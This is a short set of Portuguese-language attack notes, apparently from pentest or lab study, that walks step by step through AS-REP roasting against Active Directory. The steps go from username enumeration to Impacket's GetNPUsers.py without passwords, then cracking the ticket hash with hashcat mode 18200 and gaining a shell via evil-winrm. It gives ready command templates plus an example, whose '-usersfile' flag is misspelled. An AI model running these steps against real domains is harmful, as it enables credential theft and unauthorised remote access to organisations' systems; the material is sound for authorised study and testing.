ESSE ATAQUE É USADO PARA TENTAR CONSEGUIR UM TICKET ATRAVÉS DO KERBEROS USANDO NOMES USUÁRIOS QUE VOCÊ ENCONTROU
SEM USAR SENHAS.

	1.COLETAR NOMES DE USUÁRIOS, QUE AS VEZES PODE SE CONSEGUIR ATRAVÉS
	DA ENUMERAÇÃO SMB, COLETAR O NOME DO DOMINIO DO ACTIVE DIRECTORY.	
	
	2.SALVAR OS NOMES EM UM ARQUIVO TXT.
	
	3.FAZER O ATAQUE USANDO UMA FERRAMENTA DO IMPACKET.
		
	     COMANDO: GetNPUsers.py <nome_dominio>/ -no-pass -usersfile <arquivo_usuarios> -dc-ip <host>
		
	     EX: GetNPUsers.py ADLAB.local/ -no-pass -usesrfile usuarios.txt -dc-ip 192.167.34.32
	     
	     
	4.APÓS CONSEGUIR O TICKET, LER ELE E DESCOBRIR DE QUAL USUÁRIO É O
	TICKET E TENTAR QUEBRA-LO, USANDO HASHCAT OU O JOHN.
		
		NO HASHCAT O O CÓDIGO DA HASH É O 18200
		
		COMANDO: hashcat -m 18200 hash.txt wordlist.txt
		
	5.APÓS QUEBRAR A HASH, VOCÊ PODE TENTAR UMA SHELL COM O EVIL-WINRM USANDO 
	A SENHA E USUÁRIO DESCOBERTA.
